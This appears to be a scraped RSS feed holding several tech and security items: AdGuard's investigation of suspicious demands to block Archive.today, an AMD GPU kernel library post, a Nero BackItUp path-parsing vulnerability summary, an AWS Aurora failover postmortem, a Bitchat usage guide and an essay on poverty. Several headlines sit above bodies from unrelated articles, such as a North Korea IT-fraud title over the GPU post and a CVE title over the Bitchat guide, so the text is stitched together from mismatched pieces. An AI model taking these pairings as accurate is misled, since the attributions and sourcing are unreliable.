The agency issued a subpoena to the site’s domain registrar, asking for information about the person behind it, citing a “federal criminal investigation.”Archive.is was launched in 2012 by someone using the name  — though whether that’s their real identity remains unclear. The site lets users save “snapshots” of web pages by submitting URLs, which makes it a valuable tool for preserving content that might otherwise disappear. But because it can also be used to bypass paywalls, it’s long been a thorn in the side of many media organizations.While the exact nature of the FBI investigation hasn’t been confirmed, it is speculated it can be related to copyright or CSAM (child sexual abuse material) dissemination issues. Altogether, the situation suggests growing pressure on whoever runs Archive.is, and on intermediaries that help make its service accessible. AdGuard DNS, as it turns out, may have just become one such pressure point.A few weeks ago, we were contacted by a representative of an organization called the Web Abuse Association Defense, a French group claiming to fight against child pornography. Their website is webabusedefense.com, and here is the archived version as of November 7.They demanded that we block the domain  (and its mirrors) in AdGuard DNS, alleging that the site’s admin had refused to remove illegal content since 2023. To be clear, Archive.today allows users to take “snapshots” of any webpages, including potentially illegal material. In such cases, it’s the site admin’s job to respond to complaints and promptly remove that content.This struck us as strange — we’re not a hosting provider, and it seemed unusual for an infrastructure-level service like ours to be asked to take action like this.Soon after, the situation escalated into what we could only describe as direct threats:We won’t share all the screenshots here, but there were several similar messages.We sought legal advice, and unfortunately discovered that French law, specifically Article 6-I-7 of the Loi pour la Confiance dans l'Économie Numérique (LCEN), might actually require us to respond and apply blocking measures, at least for French users.That said, this whole situation shows just how inadequate this regulation is. Such decisions should be made by a court — a private company shouldn’t have to decide what counts as “illegal” content under threat of legal action.Even so, the story didn’t quite add up. Since someone was trying to pressure us into taking action, we decided to contact the other side, Archive.today, directly.We sent an email to Archive.today’s contact address and asked two simple questions:Can they remove the illegal content from the URLs we were informed about?Is it true that they refused to remove such content in the past, and had they been notified about it before?They replied within a few hours. The response was straightforward: the illegal content would be removed (and we verified that it was), and they had  received any previous notifications about those URLs.Moreover, they hinted that Archive.today had been targeted by a campaign of “serial” complaints, supposedly from French organizations, sent to various companies and institutions that could potentially harm the site. They even shared a link demonstrating a complaint similar to the one we had received.At that point, things were looking increasingly odd, so we decided to dig deeper into the “complainant.”The Web Abuse Association Defense website references several well-known organizations — Europol, OFAC, NCA — yet provides no details or evidence of any cooperation with them.The association itself was registered in February–March 2025, around the same time its website appeared. There is very little public information about it. Interestingly, registering an association in France can apparently be done entirely online and does not require proof of identity.The association is registered at an address used for mass company registration, which isn’t inherently problematic but it does indicate that the entire registration process could have been carried out online by a single person.Its Twitter/X account appeared only recently — in August 2025. It has just four followers, and its feed consists of just a few reposts.None of this proves anything by itself, but something still doesn’t add up. In their first email, the “head” of the association claimed that their correspondence with Archive.today started with a bailiff report from 2023. That timeline simply doesn’t fit.We examined the so-called “bailiff reports” they had sent us as evidence. It’s important to note that these aren’t bailiff reports in the English sense — they’re “constat d’huissier sur Internet,” official records of online content such as webpages, posts, or videos. These particular reports were ordered online via the service called Qualijuris, and, based on the timestamps, most of them were also created in August 2025 — not 2023.Only two of these bailiff reports were ordered in 2023 from a similar service. What’s interesting is that they weren’t ordered by WAAD. The name of the person who ordered these bailiff reports matches the name that appears in the correspondence shared with us by the Archive.today administrator — the same one he wrote about on X in 2024. In that case, the complaint appeared to come from a real lawyer — but someone had registered a domain with the lawyer’s surname, containing nothing but a redirect to the lawyer’s actual website, and did it on the same day the complaint was sent. The domain was used solely to send the emails and it is not active anymore. Interestingly, that email also invoked the LCEN law.So what is the link between WAAD and that lawyer from before? Are these bailiff reports real and could it be that this is a case of impersonation of a real person? We don’t know yet, but we hope to discover the truth soon enough.Unfortunately, we couldn’t dig any deeper about who exactly is behind WAAD. The domain  is registered with , but ownership information (including historical records) is hidden. They use ProtonMail for email, so that’s another dead end. The site itself is behind Cloudflare, making further tracing impossible.With everything said and done, here’s where things stand now:The illegal content was promptly removed from Archive.today after we notified them.The complaints against the site look extremely suspicious. In our case, they came from an organization that was only recently registered that seems deliberately set up to hide the identities of those behind it.The sample complaint shared by Archive.today’s admin shows signs of impersonating a real person. We have contacted the person in question and are currently waiting for a reply.In both our case and that other example, the recipients were pressured to act under the French LCEN law. However, that same law also provides penalties for false reports:
Art. 6-I-4 LCEN:
4. Any person who presents content or activity to the persons referred to in paragraph 2 as being illegal with the aim of having it removed or its dissemination stopped, when they know this information to be inaccurate, shall be punished by one year’s imprisonment and a fine of €15,000.We believe there are indications of criminal behavior here that should be investigated by law enforcement. Therefore, we will file an official complaint with the French police, including all relevant details.All this is unfolding amid reports of an FBI investigation into the owner of Archive.today. It seems that this investigation may be related to CSAM hosting. While we can’t confirm any connection between that case and ours, the timing is certainly suspicious.]]></content:encoded></item><item><title>Five Plead Guilty in U.S. for Helping North Korean IT Workers Infiltrate 136 Companies</title><link>https://thehackernews.com/2025/11/five-us-citizens-plead-guilty-to.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjiZLSJZYH44phyXKQDmoGmkWealYMHJ_c95Ee6EYNEGqEKPn249Xacy2yylC7XobIDqYHHJNGtBy5zTs2R_XCq6Y0kKqlfYOk4rUrMR99N1NdsOcB1prH_8KEnZr7ywk-R03KJ5sDGzKv9Wx-ICZWlU4jSLvBOpxsi_Ckv5lZBh2n_2ASjVfD8yqueEEWn/s1600/north-hackers.jpg" length="" type=""/><pubDate>Sat, 15 Nov 2025 10:21:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The U.S. Department of Justice (DoJ) on Friday announced that five individuals have pleaded guilty to assisting North Korea's illicit revenue generation schemes by enabling information technology (IT) worker fraud in violation of international sanctions.

So we'vebeenasking: How do we build AI from the hardware up? How do we lead AI developers to do what the hardware prefers?AMD GPUs are now offering state-of-the-art speeds and feeds. However, this performance is locked away from AI workflows due to the lack of mature AMD software. We share HipKittens, an opinionated collection of programming primitives to help developers realize the hardware's capabilities: optimized register tiles, 8-wave and 4-wave kernel patterns instead of wave-specialization to schedule work within processors, and chiplet-optimized cache reuse patterns to schedule work across processors.What do AMD CDNA GPUs look like? A lay of the land.An AMD MI355X GPU has 256 processors called “compute units” (CUs) and a CU contains four SIMDs. A SIMD has different execution units. A 64-thread “wave” (contrasting a 32-thread warp on NVIDIA) occupies a single SIMD. We show the MI355X memory hierarchy below.Unsurprisingly, making AMD GPUs go brr boils down to keeping the “matrix cores” (tensor cores on NVIDIA) fed. There are a few differences in how we think about this hardware: An MI355X has 70% the SRAM of a B200 (165KB instead of 228KB), lacks asynchronous matrix multiplication instructions that operate on inputs in shared or tensor memory (wgmma, tcgen05), lacks register reallocation (the ability for some waves to give their registers to others), lacks tensor memory acceleration (dedicated hardware for global memory access), and lacks first class mbarrier primitives (for fine-grained synchronization). On the other hand, AMD GPUs have a 2x larger register file per processor than the B200 and offers 60% more processors per GPU (256 compute units versus 160 streaming multiprocessors). AMD offers tiny and fine-grained matrix core instructions, while NVIDIA tensor cores instructions are generally called with large input operands. AMD has a TMA-like direct global to shared memory loads via  instructions, which bypass the register file.Towards chiplet architectures. AMD is also leading the charge in the shift from monolithic grids to chiplets. AMD splits the 256 processors into 8 chiplets called “XCDs” of 32 CUs. NVIDIA B200s include 2 chips. The AMD cache is disaggregated: an AMD XCD has a private L2 cache and there is an extra last level cache (LLC) that sits between the L2 and HBM memory.Table 1:  Peak memory and compute speeds for the latest generation GPU platforms.These differences impact the ways in which we design kernels on AMD. Of course this matters on NVIDIA, but AMD’s layouts, HIPCC compiler limitations, and (undocumented) quirky behaviors of different I/O instructions yields new challenges.Scheduling within processors: We need to rely on our register file and small matrix core instructions instead of shared memory and bulky wgmma/tcgen05 instructions to establish deep pipelines and hide memory costs. Wave specialization / producer consumer, which reigns supreme in NVIDIA kernels, is not the right answer on AMD.Scheduling across processors: We need to start thinking about NUMA effects at the cache level as we schedule work across thread blocks.We walk through these three topics next.HipKittens memory access patternsAs in ThunderKittens, in HK, developers program using tiles as the basic data structure. Tiles exist in shared or register memory, and are parametrized by a data type, size dimensions (a multiple of the matrix core instruction shape), and layout. HK provides a library of PyTorch-like functions that operate on tiles, for instance , , , ,  compute ops and load, store memory ops. A tile is collectively owned by threads in a wave (warp). The functions use template metaprogramming to generalize to different input tiles and are lightweight, directly wrapping assembly (PTX, CDNA ISA) and C++.A memory layout determines how data elements map to thread ownership. A matrix core instruction expects a particular register layout depending on the data type and instruction shape. We also want to maximize the granularity and coalescing of global memory loads. Between registers and HBM, shared memory is split into banks (4-byte regions) that can serve data simultaneously. If threads from a wave request data from the same bank at the same time, their accesses are serialized; efficient kernels use “swizzle patterns” to organize data in a way that avoids these bank conflicts.A few challenges for memory access in HK include: A core tenant of HK and TK is to give developers full control over register allocation by remaining C++ embedded. Compilers like Triton prevent register management altogether, but surprisingly we find that even the HIPCC compiler imposes severe limitations (no wonder AMD uses raw assembly!). For instance, 4-wave (1-wave per SIMD) kernels compiled via HIPCC cannot use data held in certain types of registers as inputs to matrix instructions. This motivated us to add explicit register scheduling to HK, where developers pin specific registers when creating registers tiles, effectively replacing the compiler’s register management capabilities. Developers thus have the control necessary to write peak performance kernels!: NVIDIA tensor core layouts are regular – as we vary the data type or matrix shape, the layout is composed of an underlying “core matrix” structure. Thus, frameworks like TK and Gluon can apply a unified swizzling rule to avoid bank conflicts. However, AMD layouts differ significantly based on the data type and matrix shape. In fact, we show that it’s not possible to use a single swizzle pattern for all layouts. Further, sometimes we want to use multiple matrix shapes within the same kernel meaning that our swizzle pattern needs to be compatible with multiple types of layouts concurrently.Figure: AMD register layouts for matrix instructions are less structured. NVIDIA layouts are all composed from an underlying core matrix structure. Waves (and NVIDIA warps) execute shared memory read/write instructions in phases, where a subset of threads in the wave access shared memory concurrently. NVIDIA instructions sequentially assign threads to phases (e.g., threads 0-7 in phase one, 8-15 in phase two). However, the phase groups are both non-sequential and differ entirely based on AMD CDNA memory instruction. For example, we found that a  instruction reading 128 bits for each thread executes across 4 phases and has access to 64 banks. On the other hand, a  instruction writing 64 bits for each thread executes across 4 phases and has access to only 32 banks. This behavior is not well-documented even within AMD(! 😔), so we created and release solvers that reverse-engineer this behavior. AMD GPUs support direct asynchronous HBM to shared memory loads. Like TMA, these loads bypass the register file. The instruction takes as input per-thread addresses in HBM from which each thread will read data. While DSLs like TK directly swizzle the shared memory addresses, swizzling shared memory on AMD is instead accomplished by swizzling on the HBM addresses.We provide developers with optimized tile layouts and memory access patterns by default within HK. Checkout our paper to learn more about how we implement solutions to the above challenges.HipKittens schedules within a processorIdeally we would have simple, reusable patterns for scheduling the compute and memory within kernels that generalize across AI workloads. Wave specialization / producer consumer serves this purpose on NVIDIA, but what about on AMD?But, we show that wave specialization underperforms on AMD due to the lack of register reallocation. On the MI355X, registers are statically divided across all waves. Producer waves that only need a few registers for address calculation are allocated more registers than they need; consumer waves cannot recoup those registers and must either spill registers to scratch memory or run at a lower arithmetic intensity. Both are disastrous for performance. Wave specialization limits the output tile size and makes our kernels more memory bound.  For GEMMs, data loaded from memory is O(MK + NK) while compute is O(MNK). Decreasing the M or N in our per thread block output tile size lowers arithmetic intensity.
Figure: Wave specialization underperforms on AMD GPUs. We benchmark AMD GEMMs on the MI355X using different numbers of producers (P) and consumer (C) waves. We report the matrix core intrinsic shape, output tile size computed per thread block, and TFLOPs (500 iterations warmup / 100 iterations measured). The CUTLASS GEMM is selected and tuned using the CUTLASS profiler tool on a B200 GPU.As an aside, it might be surprising that AMD matches NVIDIA GEMM performance without all the bells and whistles of wgmma/tma, producer consumer, TMA, mbarriers, large shared memory for deep multi-stage pipelining etc. But… AMD has a  larger register file and AMD’s smaller tensor core shapes (e.g., ) provide an alternative path to establish deep pipelines by using finer-granularity load and compute stages.Scheduling patterns for AMD. Our attempt to use wave specialization - a strategy that works well on NVIDIA GPUs - did not yield the expected speedups on AMD hardware. All is not lost! We found two scheduling patterns that consistently yield high occupancy AMD GPUs, while using tile programming primitives (no raw assembly)! We assign two waves per SIMD and at any given time, one is executing a cluster of memory instructions while the other wave executes a cluster of compute instructions. The waves swap at the end of cluster execution. With this approach, the developer can use large HK tiles since a thread issues many of the same instructions at once! We assign one wave per SIMD and threads in this wave finely switch between issuing memory and compute operations. Here, the developer uses small HK tiles (essentially matching the size of the matrix core instruction shape) to achieve the fine-grained schedule.These two patterns tradeoff programmability and performance, where 8-wave and its large tile primitives lead to compact code and 4-wave fine-grained interleaving expands code size. Surprisingly, the 8-wave schedule is sufficient to achieve SoTA-level performance on GEMMs and attention forwards. For GQA non-causal attention backwards, 8-wave also outperforms all AMD baselines by , and our HK 4-wave further outperforms by .Figure: HK 8-wave ping pong pattern. We include a profiler snippet of the HK BF16 GEMM.HipKittens schedules across processorsModern GPUs are moving toward chiplet-based architectures, shifting away from traditional monolithic dies. AMD’s MI355X, for instance, integrates eight chiplets (XCDs), each with its own L2 cache, while NVIDIA’s B200 pairs two dies together. This shift enables higher scalability and yield but introduces a new performance challenge: disaggregated memory hierarchies. Each cluster of compute units now has local caches, and memory locality is no longer uniform across the chip.On AMD GPUs, thread blocks are scheduled to chiplets in a round-robin fashion, meaning that the order in which blocks are launched—the grid schedule—directly affects how effectively data is reused in cache. Even perfectly tuned kernels can lose bandwidth if their grid layout is cache-unfriendly.Matrix Multiply (M=N=K=9216)Matrix Multiply (M=N=K=14592)Table: Performance results corresponding to the above chiplet swizzling figures.Above for a GEMM , we show different patterns for assigning thread blocks the responsibility of computing different tiles of the output matrix . When thread blocks are scheduled in naíve row-major order, cache reuse is suboptimal () because blocks that share the same L2 cache often load different, non-overlapping tiles of A and B. Further, optimizing purely for L2 locality can cause each XCD to fetch disjoint portions of A and B, leading to redundant loads at the next cache level.To address this, HipKittens introduces a chiplet-aware scheduling strategy that reorganizes the grid launch order to better exploit locality at both the L2 (per-chiplet) and LLC (shared) cache levels for GEMM workloads. The key idea is to group thread blocks that operate on nearby regions of the output matrix so that they naturally reuse overlapping tiles of input data across cache hierarchies.Let's take a look at a few kernels written in HK.First, here's the hot loop of our attention forwards pass kernel (the entire kernel is  lines of code). We can see that the kernel uses HK's 8-wave ping pong schedule where waves alternate between compute instruction clusters and memory clusters.Here's the core hot loop structure for our BF16 GEMM kernel. Again, we can see that waves alternate between compute clusters and memory clusters using HK's 8-wave ping pong schedule.Multi-silicon AI is coming!HipKittens delivers competitive performance on AMD CDNA3 and CDNA4 through three key insights: optimized memory access, AMD-centric wave scheduling patterns within a processor, and chiplet-aware grid scheduling across processors to exploits AMD's disaggregated cache hierarchy. Our kernels consistently achieve peak performance amongst AMD baselines across workloads (and compete with peak Blackwell kernels as well).Realizing AI's full potential requires diverse, open hardware. Today, that means making AMD GPUs truly accessible.We want more AI in the world. AI has relied on and innovated on a single hardware provider, but we need to be able to use and experiment with all the compute we can. We need to be able to use the fastest hardware out there. We’re happy to help address these problems with HipKittens!Figure: Surfing towards multi-silicon AI!]]></content:encoded></item><item><title>Critical Fortinet FortiWeb Vulnerability CVE-2025-64446</title><link>https://thecyberthrone.in/2025/11/15/critical-fortinet-fortiweb-vulnerability-cve-2025-64446/</link><author></author><category>security</category><pubDate>Sat, 15 Nov 2025 01:37:56 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

Nero BackItUp in the Nero Productline is vulnerable to a path parsing/UI rendering flaw (CWE-22) that, in combination with Windows ShellExecuteW fallback extension resolution, leads to arbitrary code execution when a user clicks a crafted entry. By creating a trailing-dot folder and placing a same-basename script, Nero BackItUp renders the file as a folder icon and then invokes ShellExecuteW, which executes the script via PATHEXT fallback (.COM/.EXE/.BAT/.CMD). The issue affects recent Nero BackItUp product lines (2019-2025 and earlier) and has been acknowledged by the vendor.

The backlog of events we needed to process from that outage on the 20th stretched our system to the limits, and so we decided to increase our headroom for event handling throughput. When we attempted that infrastructure upgrade on October 23rd, we ran into yet another race condition bug in Aurora RDS. This is the story of how we figured out it was an AWS bug (later confirmed by AWS) and what we learned.The Hightouch Events product enables organizations to gather and centralize user behavioral data such as page views, clicks, and purchases. Customers can setup syncs to load events into a cloud data warehouse for analytics or stream them directly to marketing, operational, and analytics tools to support real-time personalization use cases.Here is the portion of Hightouch’s architecture dedicated to our events system:Hightouch events system architectureOur system scales on three levers: Kubernetes clusters that contain event collectors and batch workers, Kafka for event processing, and Postgres as our virtual queue metadata store.When our pagers went off during the AWS outage on the 20th, we observed:Services were unable to connect to Kafka brokers managed by AWS MSK.Services struggled to autoscale because we couldn’t provision new EC2 nodes.Customer functions for realtime data transformation were unavailable due to AWS STS errors, which caused our retry queues to balloon in size.Kafka’s durability meant that no events were dropped once they were accepted by the collectors, but there was a massive backlog to process. Syncs with consistently high traffic or with enrichments that needed to call slower 3rd party services took longer to catch up and were testing the limits of our (small) Postgres instance’s ability to act as a queue for the batch metadata.As an aside, at Hightouch, we start with Postgres where we can. Postgres queues serve our non-events architecture well at ~1M syncs/day and for events scaled to 500K events per second at ~1s end-to-end latency on a small Aurora instance.After observing the events on the 20th, We wanted to upsize the DB to give us more headroom. Given that Aurora supports fast failovers for scaling up instances, we decided to proceed with an upgrade on Oct 23rd without a scheduled maintenance window.The central datastore for real-time streaming and warehouse delivery of customer events uses .Aurora's architecture differs from traditional PostgreSQL in a crucial way: it separates compute from storage. An Aurora cluster consists of:One primary writer instance that handles all write operationsMultiple read replica instances that handle read-only queries that all instances access, automatically replicated across multiple availability zonesThis architecture enables fast failovers and efficient read scaling, but as we'd discover, it also introduces unique failure modes.A  is the process of promoting a read replica to become the new primary writer - typically done automatically when the primary fails, or manually triggered for maintenance operations like ours. When you trigger a failover in the AWS console:Aurora designates a read replica as the new primaryThe storage layer grants write privileges to the new primaryThe cluster endpoint points to the new writerThe old primary becomes a read replica (if it's still healthy)The diagram below explains how Hightouch Events uses Aurora.How Hightouch Events uses AuroraThis was our upgrade plan:Add another read replica (instance #3) to maintain read capacity during the upgrade.Upgrade the existing reader (instance #2) to the target size and give it the highest failover priority.Trigger a failover to promote instance #2 as the new writer (expected downtime less than 15s, handled gracefully by our backend).Upgrade the old writer (instance #1) to match the size and make it a reader.Remove the temporary extra reader (instance #3).The AWS docs supported this approach and we had already tested the process successfully in a staging environment while performing a load test, so we were confident in the correctness of the procedure.At 16:39 EDT on October 23, 2025, we triggered the failover to the newly-upgraded instance #2. The AWS Console showed the typical progression: parameter adjustments, instance restarts, the usual status updates.Then the page refreshed. Instance #1 - the original writer was still the primary. The failover had .According to AWS everything was healthy. The cluster appeared healthy across the board. But our backend services couldn't execute write queries. Restarting the services cleared the errors and restored normal operation, but the upgrade had failed.We tried again at 16:43. Same result: brief promotion followed by immediate reversal.Two failed failovers in five minutes. Nothing else had changed - no code updates, no unusual queries, no traffic spikes. We had successfully tested this exact procedure in a staging environment under load earlier in the day. We checked our process to see if we had made any mistakes. We searched online to see if anyone else had encountered this issue but found nothing. Nothing obvious could explain why Aurora was refusing to complete the failover in this cluster. We were perplexed.We first checked database metrics for anything unusual. There was a spike in connection count, network traffic, and commit throughput to the read replica (instance #2) during the failover.The higher commit throughput could have been due to replication or the execution of write queries. The other two metrics simply indicated a higher query volume.We checked the read query traffic from the app (graph below), and found that there was no change during this period. This told us the extra traffic to instance #2 came from our backend services which are supposed to connect to the writer instance.Query traffic from the Hightouch appWhen we looked at the backend application logs, we found this error -DatabaseError: cannot execute UPDATE in a read-only transaction in  pods.Our services do not connect directly to the writer instance, but rather to a cluster endpoint which points to the writer. This could mean one of 3 things:The pods did not get the signal that the writer had changed - i.e. the cluster did not terminate the connection.The cluster endpoint incorrectly pointed to a reader instance.The pod was connected to the writer, but the write operation was rejected at runtime.We did not find any evidence supporting or disproving #1 in the application logs. We had a strong suspicion it was either #2 or #3. We downloaded the database logs to take a closer look and found something interesting. In both the promoted reader and the original writer, we found the same sequence of logs::: UTC::@:[]:LOG:  starting PostgreSQL...
...
...
...
LOG:  database  ready  accept connections
LOG:  server process (PID ) was terminated  signal : Killed
DETAIL:  Failed process was : write query  backend application
LOG:  terminating  other active server processes
FATAL:  CanThis led us to a hypothesis:During the failover window, Aurora briefly allowed both instances to process writes. The distributed storage layer rejected the concurrent write operations, causing both instances to crash.We expect Aurora’s failover orchestration to do something like this:Stop accepting new writes. Clients can expect connection errors until the failover completes.Finish processing in-flight write requests.Demote the writer and simultaneously promote the reader.Accept new write requests on the new writer.There was clearly a race condition between steps 3 & 4.To validate the theory, we performed a controlled failover attempt. This time:We scaled down all services that write to the databaseWe triggered the failover againWe monitored for storage runtime crashesBy eliminating , the failover completed successfully. This strongly reinforced the race-condition hypothesis.AWS Confirms the Root CauseWe escalated the findings and log patterns to AWS. After an internal review, AWS confirmed that:The root cause was due to an internal signaling issue in the demotion process of the old writer, resulting in the writer being unchanged after the failover.They also confirmed that there was nothing unique about our configuration or usage that would trigger the bug. The conditions that caused it were not under our control.AWS has indicated a fix is on their roadmap, but as of now, the recommended mitigation aligns with our solution: use Aurora’s Failover feature on an as-needed basis and ensure that no writes are executed against the DB during the failover.With the race condition understood and mitigated, we:Successfully upsized the cluster in Updated our internal playbooks to pause writers before an intentional failoverAdded monitoring to detect any unexpected writer role advertisement flipsThe following principles were reinforced during this experience:Prepare for the worst in any migration - you could end up in your desired end state, beginning state, or an in-between state - even for services you trust. Ensuring you’re ready to redirect traffic and handle brief outages in dependencies will minimize downtime.The importance of good observability cannot be emphasized enough. The “brief writer advertisement” was only detectable because we were monitoring queries to each instance in Datadog and had access to database logs in RDS.For large scale distributed systems, isolating the impact any single component can have on the system can help both uptime and maintenance. It helps a lot if the design allows for such events without completely shutting down the system.Test setups are not always representative of production environments. Even though we practiced the upgrade process during a load test in a staging region, we could not reproduce the exact conditions that caused the race condition in Aurora. AWS confirmed that there was nothing specific about our traffic pattern that would trigger it.If challenges like this investigation sound interesting, we encourage you to check out our careers page]]></content:encoded></item><item><title>CVE-2025-54339 - Desktop Alert PingAlert Remote Access Control Bypass</title><link>https://cvefeed.io/vuln/detail/CVE-2025-54339</link><author></author><category>vulns</category><pubDate>Fri, 14 Nov 2025 18:15:48 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-54339

The relentless bombing campaign has also destroyed or severely crippled any remaining communication infrastructure.Even when Palestinians use regular communication methods, their conversations and messages can be , leaving them exposed to surveillance and potential targeting.The basic human right to communicate freely, and without interruption, has been denied to the Palestinian people.Bitchat lets you keep messaging even when the internet or power is down. It connects phones directly through Bluetooth, and each phone helps pass messages along, allowing communication to stretch much farther than just your immediate area. Everything is fully encrypted so your conversations stay private.When you do have internet or cell service, Bitchat can send your messages anywhere in the world using a network of relays. There is no central server that stores any of your data. You don’t need to create an account, share your phone number or email, or even have a SIM card to use it.Staying connected when all else failsBitchat is an Israel-proof messaging alternative that continues to work even when traditional networks are shut down. The app also has “Geohash” channels that allows users to join location-based chats, so Palestinians can stay connected to their neighbors down the street or to the larger community in cities across the region. This lets Palestinians check on the safety of loved ones, organize and coordinate within their communities, and share critical news and updates.T4P has evaluated the app, testing it in various conditions, and looked at the technology and governance of the application. After this evaluation, T4P recognizes it as a secure and resilient communication tool for Palestinian communities when faced with internet disruptions or outages. In addition, Tech for Palestine community members are among BitChat’s top code contributors.Bitchat has seen a surge in downloads in countries facing civil unrest like Nepal, Indonesia, Côte d'Ivoire, and most recently Madagascar.

Communicating via WhatsApp or social media presents the risk of exposing private data, limiting free expression, and undermining user privacy. BitChat does not have the same vulnerabilities and does not allow Meta to help Israel surveil Palestinians.You can start using Bitchat easily, without even creating an account. To start, download the app from the  or .Once installed, the first thing you should do is change the default @anon username at the top. Click on it to change. The blue #mesh channel in the top right corner will indicate that you are active on your local bluetooth network. Next to it you will see an icon with the number of users connected within your network. Click on the icon and begin private conversations with users from the list.We recommend confirming your friends’ and family members’ usernames in person when possible. This helps make sure you’re talking to the right people and avoids confusion or impersonation. Once you’ve confirmed someone’s identity, you can start messaging them privately. You can also “favorite” them so they’re easy to find later.Begin messaging by using the “type a message…” box. Type in a forward slash / to open the menu for additional commands and options.If you click on the blue #mesh channel on the top right it will open the various location channels available. #mesh: The mesh channel is your local bluetooth network that extends as far as the number of connected devices using Bitchat. So the more users with the ability to relay over distance, the larger the network. This is the channel that will allow you to communicate when all other networks are down. Location channels: You will see default channel names for your block, neighborhood, city, province, and region. These work best when connected to the internet.  #Geohash: the geohash channel is a custom channel that you can start to connect with your immediate family or local groups. Type in a name for your channel and click teleport. Users within your network can then join it. It is encouraged to clear your messages with the command “/c” on a regular basis. This is good practice in the scenario where your phone is confiscated. Messages are only accessible on device as Bitchat has no central servers. If you delete the messages, they aren’t accessible anywhere.  provides renewable eSIMs to restore internet access across Gaza, helping people stay connected and access essential services. Paired with Bitchat, it can help communication continue even when networks are down.Download Bitchat today and see  that Tech for Palestine has been working on. Stay connected, stay safe. ]]></content:encoded></item><item><title>Germany to ban Huawei from future 6G network</title><link>https://www.bloomberg.com/news/articles/2025-11-13/germany-to-ban-huawei-from-future-6g-network-in-sovereignty-push</link><author>teleforce</author><category>dev</category><pubDate>Fri, 14 Nov 2025 17:19:08 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Upcoming Speaking Engagements</title><link>https://www.schneier.com/blog/archives/2025/11/upcoming-speaking-engagements-50.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Fri, 14 Nov 2025 17:08:57 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[This is a current list of where and when I am scheduled to speak:I’m speaking on “Integrity and Trustworthy AI” at North Hennepin Community College in Brooklyn Park, Minnesota, USA, on Friday, November 21, 2025, at 2:00 PM CT.

The advice folks will give comes from a good place. However, I would like to give some examples to help everyone understand most advice from non-poor folks isn’t helpful.Everyone has experienced being broke. Being broke sucks. You are watching every dollar spent, finding ways to trim or make things stretch until the next payday. The difference is when you are broke you have . You can afford to put gas in your car, but not enough to do that repair. Money is tight, but you can get the basics at the grocery store. You can’t afford to go to the movies, but will stay home and watch what’s new on Netflix.When you are poor that next payday brings no relief. It is like an endless runner game. No matter how fast you run or how high you jump you can never see the finish line. No matter how tired you are the ground keeps moving. There is no room for errors as the punishment for mistakes is astronomical. When you hit an obstacle you don’t restart from the last checkpoint, you go back to the beginning.There is this mindset from folks that poor people must not be smart. I mean, you’re smart and you’re not poor! The problem must be a skill issue! Learn the skills to do it yourself and you’ll be able to pull yourself up.The other mindset is poor people are lazy. Quit complaining and do it yourself!  Just get a better job! Get a second job! There’s money out there, you just have to go get it.The last is these folks think they understand what it is like to be poor. Hey, I was a broke college student and I get being poor! I had a rough patch, it will pass.I have a van that is falling apart. It needs a lot of work that we cannot afford to do. In the mindset that poor people are unskilled, it appears that I should watch some YouTube videos, get the parts, and do it myself. The misunderstanding is that being poor means you have tons and tons of skills. You have to fix everything yourself. There is never, I mean never, a time you can pay someone to fix it for you.In this example folks think, “If the repair at the shop costs $1,000, but the parts cost $300, you can save a lot of money doing it yourself.” You are absolutely correct. Yet, I still need to be able to afford the $300 in parts.Do you see the misunderstanding? I can’t make $300 appear out of thin air. I have the skills, I’ve had to fix all my cars myself. I’ve done complete engine rebuilds, I’ve replaced transmissions, I do all my own regular maintenance. The problem isn’t skills, its . When you are broke, spending $300 instead of $1,000 sounds like a win because you can’t afford the $1,000. When you’re poor $300 might as well be $1,000 or $10,000, you will never afford it.This is not a matter of time, either. I can’t put aside money each month and then get it. There is never money to put aside. I can’t put it on the credit card as I know I will never be able to pay it. I’ll just have this $300 debt looming over me, increasing with interest every month, mocking how much of a loser I am.The second mindset: Being lazy.How do I have the time to work multiple jobs when I’m doing all this extra work? How do I have the time when in my extra time I’m fixing cars, appliances, the roof, and cooking every meal from scratch?Should I work a second job and never see my wife? My kids? Should I never have any personal time? Should my entire life revolve around money? Should I kill myself for capitalism?Folks who say things like this have only ever experienced being broke. It is a temporary situation and a few months of extra income will solve the problem. Being poor is not missing $1,000 or $10,000 in the short term. It’s missing $40,000 a year, every year, forever. There is no short term relief. This isn’t a rough patch. It is The Pit in The Dark Knight Rises.“There’s a reason why this prison is the worst hell on earth… Hope. Every man who has rotted here over the centuries has looked up to the light and imagined climbing to freedom. So easy… So simple… And like shipwrecked men turning to sea water from uncontrollable thirst, many have died trying. I learned here that there can be no true despair without hope.”Yes, it is possible to escape. Hell, two people have done it! Why can’t you do it! But you are completely ignoring how many people have fallen to their death trying.All of the general guidance to escape being poor is actually advice for getting through being broke.These are all things that will help you . It will help you get through a short period of being broke. Or it will help you get your spending under control. You have enough money, you just don’t spend it wisely.Being poor is you already did all those things. You cancelled all your streaming services years ago. You make all your food from scratch all the time. You never go to fucking Starbucks. You fix everything yourself. You already stretch everything to the limit. That is how you have to live every day of your life, for eternity, with no relief in sight.Last example and is pertinent to our times in the US. A lot of poor folks are having to stand in line for hours and hours to get food at a food bank due to goverment ineptitude. The advice to simply cook at home doesn’t fix that there isn’t any food at home.Do you honestly think people standing in line at a food bank could fix their situation if they stopped getting DoorDash? Going to Starbucks? Fuck off. They weren’t doing that already.How are they to get another job or put in extra hours if they have to stand in line for 3 hours to get food? Should they go without food until they get that job and the paycheck?You need to step aside and think about the differences between being broke and being poor.Thank you for reading!

